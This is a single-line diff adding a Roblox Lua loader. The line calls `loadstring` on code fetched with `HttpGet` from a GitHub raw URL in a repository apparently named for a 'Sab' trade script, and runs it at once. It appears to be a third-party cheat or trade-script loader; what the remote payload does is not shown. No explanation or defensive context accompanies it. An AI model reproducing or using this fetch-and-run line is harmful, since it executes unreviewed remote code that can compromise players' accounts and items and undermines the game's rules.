@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Sab-Script-mzl/Sab-Script-Trade-Script999/refs/heads/main/lua'))()
